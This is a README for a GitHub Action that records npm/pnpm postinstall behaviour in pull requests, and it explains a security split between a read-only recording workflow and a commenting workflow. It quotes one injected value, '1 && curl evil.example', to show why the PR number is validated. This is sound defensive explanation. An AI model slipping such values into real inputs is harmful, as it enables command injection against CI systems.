# InstallScope Action

Two composite actions and two workflows. The split is a security boundary, not an organisational
preference — see [Why two workflows](#why-two-workflows) before changing it.

```
pull_request  ──▶ record.yml   (read-only token)  ──▶ artifact
                                                        │
workflow_run  ──▶ comment.yml  (pull-requests: write) ──┘──▶ PR comment
```

## Usage

Copy both workflows into `.github/workflows/`:

```yaml
# .github/workflows/installscope.yml
name: installscope
on:
  pull_request:
    paths: ["**/package-lock.json", "**/pnpm-lock.yaml"]
permissions:
  contents: read          # NOT pull-requests: write. See below.
jobs:
  record:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: mukti-sys/InstallScope/action/record@v0
```

```yaml
# .github/workflows/installscope-comment.yml
name: installscope-comment
on:
  workflow_run:
    workflows: ["installscope"]
    types: [completed]
permissions:
  pull-requests: write
  contents: read
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: mukti-sys/InstallScope/action/comment@v0
```

## Why two workflows

The recording job runs `npm install`, which runs postinstall scripts from every package in the
dependency tree. That is the entire point of the product — and it means the recording job executes
arbitrary code from a pull request that may come from a stranger (PRD.md:23 names that as the primary
user's situation).

A job that executes untrusted code must not hold a token that can write to the repository. So:

| | `record.yml` | `comment.yml` |
|---|---|---|
| Trigger | `pull_request` | `workflow_run` |
| Runs untrusted code | **yes** | no |
| Token | read-only | `pull-requests: write` |
| Sees repo secrets | no | no (none are used) |
| Reads | the PR's checkout | only the uploaded artifact |

Three specific things this rules out:

1. **`pull_request_target` is refused.** It runs with a write-capable token in the base repository's
   context, so a malicious postinstall script would inherit it. There is no configuration of this
   product where that is acceptable.
2. **`pull-requests: write` on the recording workflow is refused.** GitHub already downgrades the token
   to read-only for forked PRs, which means a single-workflow design fails to comment on exactly the PRs
   that matter most, and *appears* to work during testing on same-repo branches.
3. **The comment job does not check out the PR's code.** It reads the artifact and nothing else, so
   nothing from the PR is executed in the job that holds the write token.

## The artifact contract

`record.yml` uploads one artifact named `installscope-report`, and `comment.yml` reads it. The contract
between them is deliberately narrow, because the comment job must not trust anything more than it has to:

| File | Purpose |
|---|---|
| `pr.txt` | The PR number, so the comment job knows where to post. |
| `installscope-comment.md` | The rendered comment body. |
| `events.jsonl` | The recording itself, for the evidence link. |
| `installscope.sarif.json` | SARIF, uploaded to code scanning by `record.yml`. |
| `installscope-report.html` | The self-contained evidence artifact. |
| `installscope-diff.md` | Present only when the registry held a previous version. |

`comment.yml` validates the PR number is a plain integer before using it. The number arrives from a file
written by a job that ran untrusted code, so it is untrusted input — a value like
`1 && curl evil.example` reaching a shell would be a command injection in the one job that holds a
write token.

## What is deliberately absent

- **No `fail-on` default.** PRD.md:43 makes the comment advisory; blocking is opt-in per repository via
  the `fail-above` input. `Scope.md`:38 refuses blocking-by-default outright.
- **Strace backend in CI.** The `action/record` composite action runs the `strace` engine (v1.0). GitHub-hosted
  runners do not grant root eBPF capabilities by default, so while the `aya` backend (v1.1) is verified
  via local parity testing and dedicated CI workflows (`phase2-aya.yml`), PR workflows execute `strace`.
- **No network egress.** The recorder uploads nothing. `installscope snapshot push` writes to a local
  directory that becomes an artifact; Architecture.md:103 forbids the product having network authority.
- **No telemetry.** Rules.md §1: "we watch packages, not people."
- **No lockfile format beyond npm and pnpm.** `Scope.md`:41.
